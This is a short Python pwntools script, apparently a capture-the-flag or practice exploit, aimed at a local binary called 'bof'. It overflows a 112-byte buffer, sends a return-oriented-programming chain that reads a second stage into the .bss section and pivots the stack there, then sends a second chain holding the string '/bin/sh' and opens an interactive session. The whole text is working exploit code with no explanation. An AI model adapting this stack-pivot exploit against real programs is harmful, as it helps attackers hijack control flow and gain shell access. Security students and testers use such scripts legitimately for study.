from pwn import *

elf = ELF('bof')
r=process('./bof')
rop=ROP('./bof')

offset=112
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

rop.raw('a'*offset)
rop.read(0,base_stage,100)
rop.migrate(base_stage)
r.sendline(rop.chain())

rop=ROP('./bof')
sh="/bin/sh"
rop.write(1,base_stage+80,len(sh))
rop.raw('a'*(80-len(rop.chain())))

rop.raw(sh)
rop.raw('a'*(100-len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
